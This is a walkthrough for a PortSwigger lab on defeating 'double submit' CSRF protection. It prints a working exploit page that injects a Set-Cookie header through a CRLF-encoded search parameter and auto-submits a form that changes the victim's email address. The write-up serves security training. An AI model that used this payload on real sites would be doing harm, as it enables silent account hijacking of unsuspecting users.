[Source](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)
## Task
The email address change functionality in this lab is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.
To solve the task, use your exploit server to host an HTML page that uses a CSRF attack to change the email address of the user viewing the page.
You can log in to your account using the following credentials: `wiener:peter`
## Solution
Go to the task page

![image](images/20241224200756.png)

Log in as `wiener`

![image](images/20241224200854.png)

Change your email and intercept the request via `Burp Suite`. Send it to `Repeater`

![image](images/20241224201102.png)

We see that `csrf` in `cookie` and `csrf` at the bottom of the request are duplicated. Right-click and then `Engagement tools > Generate CSRF PoC`. Remove the lines with `<script>` and instead enter
```Request
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```
, replacing `YOUR-LAB-ID.web-security-academy.net` with `Host`. We also change the `<input type="hidden" name="csrf" value="mgdjbvbnd34bnvfs" />` to `fake`

```HTML
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a960015048ee12080f90da300810055.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="fake" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a960015048ee12080f90da300810055.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
  </body>
</html>
```

![image](images/20241224201756.png)

Copy the HTML code and go to `Exploit Server`. In it, in the `Body` field, insert this HTML code

![image](images/20241224201543.png)

Then click `Store` and `Deliver exploit to victim`

![image](images/20241224201807.png)
